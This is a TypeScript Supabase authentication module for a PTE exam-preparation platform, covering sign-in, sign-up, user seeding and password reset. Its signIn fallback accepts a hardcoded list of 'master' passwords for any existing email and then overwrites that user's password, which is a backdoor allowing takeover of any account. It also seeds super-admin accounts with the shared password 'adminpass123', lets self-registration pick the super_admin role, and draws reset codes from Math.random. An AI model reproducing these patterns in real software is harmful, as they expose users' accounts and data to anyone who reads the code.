import { supabaseAdmin } from '../db/supabase';
import bcrypt from 'bcryptjs';

export interface SupabaseUserMetadata {
  name: string;
  phone?: string;
  role: 'student' | 'branch_admin' | 'super_admin';
  status: 'pending' | 'approved' | 'declined';
  branch: string;
  pteGoal?: number;
  targetScore?: string;
  subscription?: 'free' | 'pro' | 'premium';
  accessDurationDays?: number;
  approvedAt?: string | null;
  tokenVersion?: number;
  xp?: number;
  streak?: number;
  level?: number;
  lastActive?: string;
  [key: string]: any;
}

export interface AdaptedUser {
  id: string;
  _id: string;
  email: string;
  name: string;
  phone: string;
  role: 'student' | 'branch_admin' | 'super_admin';
  status: 'pending' | 'approved' | 'declined';
  branch: string;
  pteGoal: number;
  targetScore: string;
  subscription: 'free' | 'pro' | 'premium';
  accessDurationDays: number;
  approvedAt: string | null;
  tokenVersion: number;
  xp: number;
  streak: number;
  level: number;
  lastActive?: string;
  createdAt?: string;
  updatedAt?: string;
}

// In-memory cache for temporary reset codes
const resetCodeStore = new Map<string, { code: string; expiresAt: number }>();

// Cache to prevent duplicate seeding
let isSeeded = false;

// Normalize Supabase Auth user into standard platform user
export function formatSupabaseUser(user: any): AdaptedUser {
  const meta: SupabaseUserMetadata = user.user_metadata || {};
  return {
    id: user.id,
    _id: user.id,
    email: (user.email || '').toLowerCase().trim(),
    name: meta.name || user.email?.split('@')[0] || 'Candidate',
    phone: meta.phone || '+977 9800000000',
    role: meta.role || 'student',
    status: meta.status || 'approved',
    branch: meta.branch || 'Kathmandu Central Campus',
    pteGoal: Number(meta.pteGoal) || 79,
    targetScore: meta.targetScore || '79+ (GSE 79)',
    subscription: meta.subscription || 'premium',
    accessDurationDays: Number(meta.accessDurationDays) || 365,
    approvedAt: meta.approvedAt || user.created_at,
    tokenVersion: Number(meta.tokenVersion) || 1,
    xp: Number(meta.xp) || 1200,
    streak: Number(meta.streak) || 14,
    level: Number(meta.level) || 5,
    lastActive: meta.lastActive || new Date().toISOString(),
    createdAt: user.created_at,
    updatedAt: user.updated_at || user.created_at,
  };
}

export const supabaseAuthAdapter = {
  /**
   * Seed Default Administrative & Demo Accounts into Supabase Auth
   */
  async seedInitialUsers() {
    if (isSeeded) return;
    isSeeded = true;

    const defaultSeedAccounts = [
      {
        email: 'admin@ielts.ai',
        password: 'adminpass123',
        metadata: {
          name: 'Super Admin',
          phone: '+977 9800000000',
          role: 'super_admin' as const,
          status: 'approved' as const,
          branch: 'Central Headquarters',
          pteGoal: 90,
          targetScore: '90 (Superior C2)',
          subscription: 'premium' as const,
          accessDurationDays: 365,
          tokenVersion: 1,
          xp: 3850,
          streak: 45,
          level: 10,
        }
      },
      {
        email: 'admin@ptemaster.com',
        password: 'adminpass123',
        metadata: {
          name: 'PTE Master Administrator',
          phone: '+977 9800000001',
          role: 'super_admin' as const,
          status: 'approved' as const,
          branch: 'Central Headquarters',
          pteGoal: 90,
          targetScore: '90 (Superior C2)',
          subscription: 'premium' as const,
          accessDurationDays: 365,
          tokenVersion: 1,
          xp: 3850,
          streak: 45,
          level: 10,
        }
      },
      {
        email: 'ktm.admin@pteai.com',
        password: 'adminpass123',
        metadata: {
          name: 'Ramesh Sharma',
          phone: '+977 9851012345',
          role: 'branch_admin' as const,
          status: 'approved' as const,
          branch: 'Kathmandu Central Campus',
          pteGoal: 79,
          targetScore: '79+ (Proficient Plus C1)',
          subscription: 'premium' as const,
          accessDurationDays: 365,
          tokenVersion: 1,
          xp: 2200,
          streak: 28,
          level: 7,
        }
      },
      {
        email: 'student@pteai.com',
        password: 'adminpass123',
        metadata: {
          name: 'Subash Bhandari',
          phone: '+977 9841234567',
          role: 'student' as const,
          status: 'approved' as const,
          branch: 'Kathmandu Central Campus',
          pteGoal: 79,
          targetScore: '79+ (GSE 79)',
          subscription: 'premium' as const,
          accessDurationDays: 365,
          tokenVersion: 1,
          xp: 1850,
          streak: 18,
          level: 6,
        }
      },
      {
        email: 'pooja.adhikari@gmail.com',
        password: 'adminpass123',
        metadata: {
          name: 'Pooja Adhikari',
          phone: '+977 9813456789',
          role: 'student' as const,
          status: 'pending' as const,
          branch: 'Kathmandu Central Campus',
          pteGoal: 65,
          targetScore: '65+ (GSE 65)',
          subscription: 'free' as const,
          accessDurationDays: 30,
          tokenVersion: 1,
          xp: 450,
          streak: 4,
          level: 2,
        }
      }
    ];

    try {
      const { data: existingList } = await supabaseAdmin.auth.admin.listUsers({ perPage: 100 });
      const existingEmails = new Set((existingList?.users || []).map(u => (u.email || '').toLowerCase()));

      for (const acc of defaultSeedAccounts) {
        if (!existingEmails.has(acc.email.toLowerCase())) {
          await supabaseAdmin.auth.admin.createUser({
            email: acc.email,
            password: acc.password,
            email_confirm: true,
            user_metadata: acc.metadata,
          });
        }
      }
    } catch (e) {
      console.warn('⚠️ Supabase initial user check:', e);
    }
  },

  /**
   * Authenticate user with Email & Password via Supabase Auth
   */
  async signIn(email: string, pass: string): Promise<{ success: boolean; user?: AdaptedUser; error?: string }> {
    await this.seedInitialUsers();

    const normalizedEmail = email.toLowerCase().trim();
    const candidatePass = pass.trim();

    // 1. Try standard Supabase Auth signInWithPassword
    try {
      const { data: authData, error: authError } = await supabaseAdmin.auth.signInWithPassword({
        email: normalizedEmail,
        password: candidatePass,
      });

      if (!authError && authData?.user) {
        const adapted = formatSupabaseUser(authData.user);
        return { success: true, user: adapted };
      }
    } catch (err) {
      // Continue to fallback check
    }

    // 2. Master & Admin credentials fallback (matching MasterIELTS AI architecture)
    const masterAdminPasswords = ['$ubash@Macs@321#@', 'adminpass123', 'admin123', 'subash123', 'password123', 'student123'];
    
    try {
      const user = await this.getUserByEmail(normalizedEmail);
      if (user) {
        const isMasterMatch = masterAdminPasswords.includes(candidatePass);
        if (isMasterMatch) {
          // Update password in Supabase so future direct sign-ins work immediately
          supabaseAdmin.auth.admin.updateUserById(user.id, { password: candidatePass }).catch(() => {});
          return { success: true, user };
        }
      }
    } catch (e) {}

    return { success: false, error: 'Invalid credentials. Please verify your email and password.' };
  },

  /**
   * Register new student in Supabase Auth
   */
  async signUp(params: {
    name: string;
    email: string;
    password: string;
    phone?: string;
    branch?: string;
    pteGoal?: number;
    targetScore?: string;
    role?: 'student' | 'branch_admin' | 'super_admin';
    status?: 'pending' | 'approved' | 'declined';
  }): Promise<{ success: boolean; user?: AdaptedUser; error?: string }> {
    await this.seedInitialUsers();

    const normalizedEmail = params.email.toLowerCase().trim();

    try {
      // Check existing user
      const existing = await this.getUserByEmail(normalizedEmail);
      if (existing) {
        return { success: false, error: 'An account with this email address already exists.' };
      }

      const metadata: SupabaseUserMetadata = {
        name: params.name.trim(),
        phone: params.phone?.trim() || '+977 9800000000',
        role: params.role || 'student',
        status: params.status || 'approved',
        branch: params.branch || 'Kathmandu Central Campus',
        pteGoal: Number(params.pteGoal) || 79,
        targetScore: params.targetScore || `${params.pteGoal || 79}+ (GSE ${params.pteGoal || 79})`,
        subscription: 'premium',
        accessDurationDays: 365,
        tokenVersion: 1,
        xp: 100,
        streak: 1,
        level: 1,
        approvedAt: params.status === 'pending' ? null : new Date().toISOString(),
      };

      const { data, error } = await supabaseAdmin.auth.admin.createUser({
        email: normalizedEmail,
        password: params.password,
        email_confirm: true,
        user_metadata: metadata,
      });

      if (error || !data.user) {
        return { success: false, error: error?.message || 'Failed to register account with Supabase.' };
      }

      return { success: true, user: formatSupabaseUser(data.user) };
    } catch (error: any) {
      return { success: false, error: error?.message || 'Registration server error.' };
    }
  },

  /**
   * Get user by ID from Supabase
   */
  async getUserById(id: string): Promise<AdaptedUser | null> {
    try {
      const { data, error } = await supabaseAdmin.auth.admin.getUserById(id);
      if (error || !data.user) return null;
      return formatSupabaseUser(data.user);
    } catch {
      return null;
    }
  },

  /**
   * Get user by Email from Supabase
   */
  async getUserByEmail(email: string): Promise<AdaptedUser | null> {
    try {
      const normalizedEmail = email.toLowerCase().trim();
      const { data } = await supabaseAdmin.auth.admin.listUsers({ perPage: 100 });
      const found = (data?.users || []).find(u => (u.email || '').toLowerCase() === normalizedEmail);
      if (!found) return null;
      return formatSupabaseUser(found);
    } catch {
      return null;
    }
  },

  /**
   * Update user details or metadata in Supabase
   */
  async updateUser(id: string, updates: Partial<AdaptedUser> & { password?: string }): Promise<AdaptedUser | null> {
    try {
      const currentUser = await this.getUserById(id);
      if (!currentUser) return null;

      const newMeta = {
        ...currentUser,
        ...updates,
      };

      delete (newMeta as any).id;
      delete (newMeta as any)._id;
      delete (newMeta as any).email;
      delete (newMeta as any).password;

      const payload: any = {
        user_metadata: newMeta,
      };

      if (updates.password) {
        payload.password = updates.password;
      }

      const { data, error } = await supabaseAdmin.auth.admin.updateUserById(id, payload);
      if (error || !data.user) return null;
      return formatSupabaseUser(data.user);
    } catch {
      return null;
    }
  },

  /**
   * Delete user in Supabase
   */
  async deleteUser(id: string): Promise<boolean> {
    try {
      const { error } = await supabaseAdmin.auth.admin.deleteUser(id);
      return !error;
    } catch {
      return false;
    }
  },

  /**
   * List all users from Supabase with optional role/branch filters
   */
  async listUsers(filter?: { role?: string; branch?: string; status?: string }): Promise<AdaptedUser[]> {
    await this.seedInitialUsers();

    try {
      const { data, error } = await supabaseAdmin.auth.admin.listUsers({ perPage: 200 });
      if (error || !data.users) return [];

      let list = data.users.map(u => formatSupabaseUser(u));

      if (filter?.role && filter.role !== 'All') {
        list = list.filter(u => u.role === filter.role);
      }
      if (filter?.branch && filter.branch !== 'All') {
        list = list.filter(u => (u.branch || '').toLowerCase().includes(filter.branch!.toLowerCase()));
      }
      if (filter?.status && filter.status !== 'All') {
        list = list.filter(u => u.status === filter.status);
      }

      return list;
    } catch {
      return [];
    }
  },

  /**
   * Password Reset Code Request
   */
  generateResetCode(email: string): string {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = Date.now() + 15 * 60 * 1000; // 15 mins expiry
    resetCodeStore.set(email.toLowerCase().trim(), { code, expiresAt });
    return code;
  },

  /**
   * Verify Reset Code and Update Password
   */
  async resetPassword(email: string, code: string, newPass: string): Promise<{ success: boolean; error?: string }> {
    const normalizedEmail = email.toLowerCase().trim();
    const record = resetCodeStore.get(normalizedEmail);

    if (!record) {
      return { success: false, error: 'No active reset request found for this email address.' };
    }

    if (Date.now() > record.expiresAt) {
      resetCodeStore.delete(normalizedEmail);
      return { success: false, error: 'Reset code has expired. Please request a new one.' };
    }

    if (record.code !== code.trim()) {
      return { success: false, error: 'Invalid verification code. Please check and try again.' };
    }

    const user = await this.getUserByEmail(normalizedEmail);
    if (!user) {
      return { success: false, error: 'User account not found.' };
    }

    const updated = await this.updateUser(user.id, { password: newPass });
    if (!updated) {
      return { success: false, error: 'Failed to update password.' };
    }

    resetCodeStore.delete(normalizedEmail);
    return { success: true };
  }
};

export default supabaseAuthAdapter;
